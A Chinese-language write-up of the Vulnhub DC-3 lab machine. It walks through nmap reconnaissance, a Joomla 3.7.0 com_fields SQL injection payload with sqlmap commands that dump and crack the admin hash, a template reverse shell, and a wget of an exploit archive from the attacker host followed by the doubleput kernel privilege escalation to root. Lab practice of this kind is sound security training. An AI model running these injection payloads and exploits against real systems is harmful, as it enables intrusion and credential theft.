---
title: Vulnhub-DC-3
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# DC-3

> [https://www.vulnhub.com/entry/dc-32,312/](https://www.vulnhub.com/entry/dc-32,312/)
> 

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`158`
    
    ```php
    nmap -sP 192.168.75.0/24
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-29 13:33 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00034s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00034s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.158
    Host is up (0.00021s latency).
    MAC Address: 00:0C:29:48:D8:1E (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00043s latency).
    MAC Address: 00:50:56:FB:E7:F4 (VMware)
    Nmap scan report for 192.168.75.151
    Host is up.
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.158  
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-29 13:34 CST
    Nmap scan report for 192.168.75.158
    Host is up (0.00089s latency).
    Not shown: 65534 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    80/tcp open  http
    MAC Address: 00:0C:29:48:D8:1E (VMware)
    ```
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sT -sV -O -p80 192.168.75.158
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-29 13:37 CST
    Nmap scan report for 192.168.75.158
    Host is up (0.00084s latency).
    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    MAC Address: 00:0C:29:48:D8:1E (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    ```
    
4. 扫描漏洞
    
    ```sql
    nmap -script=vuln -p 80 192.168.75.158 
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-29 13:37 CST
    Nmap scan report for 192.168.75.158
    Host is up (0.00020s latency).
    
    PORT   STATE SERVICE
    80/tcp open  http
    | http-internal-ip-disclosure: 
    |_  Internal IP Leaked: 127.0.1.1
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    | http-enum: 
    |   /administrator/: Possible admin folder
    |   /administrator/index.php: Possible admin folder
    |   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
    |   /language/en-GB/en-GB.xml: Joomla version 3.7.0
    |   /htaccess.txt: Joomla!
    |   /README.txt: Interesting, a readme.
    |   /bin/: Potentially interesting folder
    |   /cache/: Potentially interesting folder
    |   /images/: Potentially interesting folder
    |   /includes/: Potentially interesting folder
    |   /libraries/: Potentially interesting folder
    |   /modules/: Potentially interesting folder
    |   /templates/: Potentially interesting folder
    |_  /tmp/: Potentially interesting folder
    | http-vuln-cve2017-8917: 
    |   VULNERABLE:
    |   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-8917
    |     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
    |       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
    |       to execute aribitrary SQL commands via unspecified vectors.
    |       
    |     Disclosure date: 2017-05-17
    |     Extra information:
    |       User: root@localhost
    |     References:
    |       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.158
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.158:80/
    |     Form id: login-form
    |     Form action: /index.php
    |     
    |     Path: http://192.168.75.158:80/index.php/2-uncategorised/1-welcome
    |     Form id: login-form
    |     Form action: /index.php
    |     
    |     Path: http://192.168.75.158:80/index.php/component/users/?view=remind&amp;Itemid=101
    |     Form id: user-registration
    |     Form action: /index.php/component/users/?task=remind.remind&Itemid=101
    |     
    |     Path: http://192.168.75.158:80/index.php/component/users/?view=remind&amp;Itemid=101
    |     Form id: login-form
    |     Form action: /index.php/component/users/?Itemid=101
    |     
    |     Path: http://192.168.75.158:80/index.php/component/users/?view=reset&amp;Itemid=101
    |     Form id: user-registration
    |     Form action: /index.php/component/users/?task=reset.request&Itemid=101
    |     
    |     Path: http://192.168.75.158:80/index.php/component/users/?view=reset&amp;Itemid=101
    |     Form id: login-form
    |     Form action: /index.php/component/users/?Itemid=101
    |     
    |     Path: http://192.168.75.158:80/index.php
    |     Form id: login-form
    |     Form action: /index.php
    |     
    |     Path: http://192.168.75.158:80/index.php/2-uncategorised/
    |     Form id: login-form
    |_    Form action: /index.php
    MAC Address: 00:0C:29:48:D8:1E (VMware)
    
    ```
    
    疑似`CSRF` ，并且扫描出CMS是`Joomla` ，并且扫出漏洞
    

## web渗透

1. 只开放一个80端口，访问主页，识别网站指纹
    
    CMS是`Joomla` ，系统是`Ubuntu` ，`PHP`
    
    ![image.png](image%2025.png)
    
2. `/administrator/manifests/files/joomla.xml` 可以找到`Joomla`版本是`3.7.0` ,下面还爆出了网站目录
    
    ```sql
    <fileset>
    <files>
    <folder>administrator</folder> // 管理后台
    <folder>bin</folder>
    <folder>cache</folder>
    <folder>cli</folder>
    <folder>components</folder>
    <folder>images</folder>
    <folder>includes</folder>
    <folder>language</folder>
    <folder>layouts</folder>
    <folder>libraries</folder>
    <folder>media</folder>
    <folder>modules</folder>
    <folder>plugins</folder>
    <folder>templates</folder>
    <folder>tmp</folder>
    <file>htaccess.txt</file>
    <file>web.config.txt</file>
    <file>LICENSE.txt</file>
    <file>README.txt</file>
    <file>index.php</file>
    </files>
    </fileset>
    ```
    
3. 在`nmap`漏洞扫描可以看到，`Joomla` 被扫出了SQL注入漏洞，`CVE-2017-8917` ，利用该漏洞
    
    > [https://nvd.nist.gov/vuln/detail/CVE-2017-8917](https://nvd.nist.gov/vuln/detail/CVE-2017-8917) | [https://blog.csdn.net/qq_51577576/article/details/129470364](https://blog.csdn.net/qq_51577576/article/details/129470364)
    > 
    
    通过漏洞手动注入寻找信息
    
    ```sql
    // 构造链接
    index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
    ```
    
    ```sql
    # 用户
    'root@localhost' 
    # 当前库
    joomladb
    # 版本
    25-0ubuntu0.16.04.2
    # 尝试查找库当前表
    '#__assets,#__associations,' 
    ```
    
    丢给`sqlmap`操作
    
    ```sql
    sqlmap -u 'http://192.168.75.158/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,*),1)' --dbs 
    [*] information_schema
    [*] joomladb
    [*] mysql
    [*] performance_schema
    [*] sys
    //
    sqlmap -u 'http://192.168.75.158/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,*),1)' -D joomladb --tables
    +----------------------------+
    | #__assets                  |
    | #__associations            |
    | #__banner_clients          |
    		    <省略>
    | #__update_sites            |
    | #__updates                 |
    | #__user_keys               |
    | #__user_notes              |
    | #__user_profiles           |
    | #__user_usergroup_map      |
    | #__usergroups              |
    | #__users                   |
    | #__utf8_conversion         |
    | #__viewlevels              |
    +----------------------------+ // 刚刚手动就只能爆出前两个
    // 这里开始就要设置参数了
    ```
    
    扫描出`#__users` 表但是默认设置是爆不出列的，扫描字段的时候需要爆破，使用默认的字典就行
    
    ```sql
    sqlmap -u "http://192.168.75.158/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb -T '#__users' --columns
    //                                                                                                                           
    Database: joomladb
    Table: #__users
    [6 columns]
    +----------+-------------+
    | Column   | Type        |
    +----------+-------------+
    | name     | non-numeric |
    | email    | non-numeric |
    | id       | numeric     |
    | params   | non-numeric |
    | password | non-numeric |
    | username | non-numeric |
    +----------+-------------+
    ```
    
    爆出六个字段，其中有我最喜欢的`password`和`username`
    
    ```sql
    sqlmap -u "http://192.168.75.158/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb -T '#__users' -C username,password --dump
    //
    +----------+--------------------------------------------------------------+
    | username | password                                                     |
    +----------+--------------------------------------------------------------+
    | admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |
    +----------+--------------------------------------------------------------+
    ```
    
    放去`john`进行爆破，得出密码`snoopy`           
    
    ```sql
    john pass    
    //                                           
    Using default input encoding: UTF-8
    Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
    Cost 1 (iteration count) is 1024 for all loaded hashes
    Will run 8 OpenMP threads
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Proceeding with wordlist:/usr/share/john/password.lst
    snoopy           (?)     
    1g 0:00:00:00 DONE 2/3 (2024-09-29 15:29) 1.785g/s 128.5p/s 128.5c/s 128.5C/s 123456..wizard
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed. 
    ```
    
4. 登陆后台利用
    - 扫描出后台地址`/administrator` ，登陆
    - 利用后台反弹shell
        
        在模板添加反弹shell代码，然后点击 `templates preview` ，得到shell
        
        ![image.png](image%2026.png)
        

## 提权

1. 查看权限
    
    ```sql
    www-data@DC-3:/var/www/html$ whoami
    www-data
    //
    www-data@DC-3:/var/www/html$ id  
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    //
    www-data@DC-3:/var/www/html$ uname -a
    Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
    //
    www-data@DC-3:/var/www/html$ sudo -l
    sudo: no tty present and no askpass program specified
    ```
    
2. 信息枚举
    - 查找是否存在suid的权限可执行文件
        
        ```sql
        www-data@DC-3:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
        //
        /bin/ping6
        /bin/ntfs-3g
        /bin/umount
        /bin/su
        /bin/fusermount
        /bin/mount
        /bin/ping
        /usr/lib/snapd/snap-confine
        /usr/lib/policykit-1/polkit-agent-helper-1
        /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
        /usr/lib/openssh/ssh-keysign
        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        /usr/lib/eject/dmcrypt-get-device
        /usr/bin/passwd
        /usr/bin/newgidmap
        /usr/bin/gpasswd
        /usr/bin/sudo
        /usr/bin/pkexec
        /usr/bin/chsh
        /usr/bin/chfn
        /usr/bin/newuidmap
        /usr/bin/newgrp
        /usr/bin/at
        ```
        
    - 查找数据库配置文件，在当前目录下`configuration.php` ,得到数据库用户密码
        
        账号 root 密码 squires
        
        但是登陆不成功
        
    - 搜索内核本地权限提升漏洞
        
        ```sql
        searchsploit Ubuntu 16.04      
        ------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
         Exploit Title                                                                                                                                        |  Path
        ------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
        Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                                                                                      | linux/local/40937.txt
        Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                                                         | linux/local/40054.c
        Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumbnailer' + 'totem' Drive-By Download                                  | linux/local/40943.txt
        LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation                                                                             | linux/local/41923.txt
        Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Local Privilege Escal | linux_x86-64/local/42275.c
        Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege Escalation                   | linux_x86/local/42276.c
        Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                                                                 | linux/dos/39773.txt
        Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR & SMEP Bypass) Arbitrary File Read                                                             | linux/local/45175.c
        Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                                                       | linux/local/40759.rb
        Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak                                                                    | linux/dos/46529.c
        Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                                      | linux_x86-64/local/40871.c
        Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation                                               | linux_x86-64/local/40049.c
        Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation                                           | windows_x86-64/local/47170.c
        Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                                                          | linux/local/39772.txt
        Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                                                                | linux/local/40489.txt
        Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                                                            | linux/dos/45919.c
        Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                         | linux/local/45010.c
        Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                | linux/local/44298.c
        Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                     | linux_x86-64/local/44300.c
        Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                 | linux/local/43418.c
        Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                             | linux/local/47169.c
        ------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------
        ```
        
        拉取 `39772.txt` （因为版本号等对的上） ,查看里面存在exp地址，里面存在文件以及操作方法
        
        > [https://project-zero.issues.chromium.org/issues/42452340](https://project-zero.issues.chromium.org/issues/42452340)
        > 
        
        下载`exp.zip`，开启临时服务器供靶机下载
        
        ```sql
        www-data@DC-3:/tmp$ wget http://192.168.75.151/exploit.tar
        wget http://192.168.75.151/exploit.tar
        --2024-09-29 18:13:43--  http://192.168.75.151/exploit.tar
        Connecting to 192.168.75.151:80... connected.
        HTTP request sent, awaiting response... 200 OK
        Length: 20480 (20K) [application/x-tar]
        Saving to: 'exploit.tar'
        
             0K .......... ..........                                 100% 76.0M=0s
        
        2024-09-29 18:13:43 (76.0 MB/s) - 'exploit.tar' saved [20480/20480]
        ```
        
        靶机下载后解压，先运行`./compile.sh` 再运行`./doubleput` 即可获得root权限
        
        ```sql
        www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./compile.sh
        doubleput.c: In function 'make_setuid':
        doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
            .insns = (__aligned_u64) insns,
                     ^
        doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
            .license = (__aligned_u64)""
                       ^
        //              
        www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./doubleput
        starting writev
        woohoo, got pointer reuse
        writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
        suid file detected, launching rootshell...
        we have root privs now...
        id
        uid=0(root) gid=0(root) groups=0(root),33(www-data)
        whoami
        root
        ```
        
    - 读取`flag`文件
        
        ```sql
        root@DC-3:/root# cat the-flag.txt
        cat the-flag.txt
         __        __   _ _   ____                   _ _ _ _ 
         \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
          \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
           \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
            \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
                                                             
        
        Congratulations are in order.  :-)
        
        I hope you've enjoyed this challenge as I enjoyed making it.
        
        If there are any ways that I can improve these little challenges,
        please let me know.
        
        As per usual, comments and complaints can be sent via Twitter to @DCAU7
        
        Have a great day!!!!
        ```